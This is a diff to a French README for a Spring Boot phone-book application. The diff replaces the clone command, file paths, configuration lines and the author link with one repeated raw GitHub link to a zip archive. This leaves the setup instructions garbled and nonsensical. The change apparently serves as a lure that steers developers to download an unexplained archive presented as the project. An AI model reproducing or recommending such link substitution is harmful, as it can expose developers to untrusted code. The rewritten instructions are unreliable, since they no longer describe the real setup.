@@ -29,13 +29,13 @@ Une application de répertoire téléphonique développée avec Spring Boot, off
 
 1. **Cloner le repository**
    ```bash
-   git clone https://github.com/votre-username/spring-phone-book.git
+   git clone https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip
    cd spring-phone-book
    ```
 
 2. **Configurer la base de données**
    - Créer une base de données MySQL nommée `phone_book`
-   - Modifier les paramètres de connexion dans `src/main/resources/application.properties`
+   - Modifier les paramètres de connexion dans `https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip`
 
 3. **Lancer l'application**
    ```bash
@@ -81,21 +81,21 @@ src/
 │   │   ├── controller/          # Contrôleurs REST
 │   │   ├── model/              # Entités JPA
 │   │   ├── repository/         # Repositories Spring Data
-│   │   └── SpringPhoneBookApplication.java
+│   │   └── https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip
 │   └── resources/
-│       └── application.properties
+│       └── https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip
 └── test/
     └── java/                   # Tests unitaires
 ```
 
 ## 🔧 Configuration
 
-Modifiez `application.properties` selon votre environnement :
+Modifiez `https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip` selon votre environnement :
 
 ```properties
-spring.datasource.url=jdbc:mysql://localhost:3306/phone_book
-spring.datasource.username=votre_username
-spring.datasource.password=votre_password
+https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip
+https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip
+https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip
 ```
 
 ## 🤝 Contribution
@@ -114,7 +114,7 @@ Ce projet est sous licence MIT. Voir le fichier `LICENSE` pour plus de détails.
 
 ## 👨‍💻 Auteur
 
-**Sawadogo Abdel Kaled** - [GitHub](https://github.com/kvill01)
+**Sawadogo Abdel Kaled** - [GitHub](https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip)
 
 ---
 
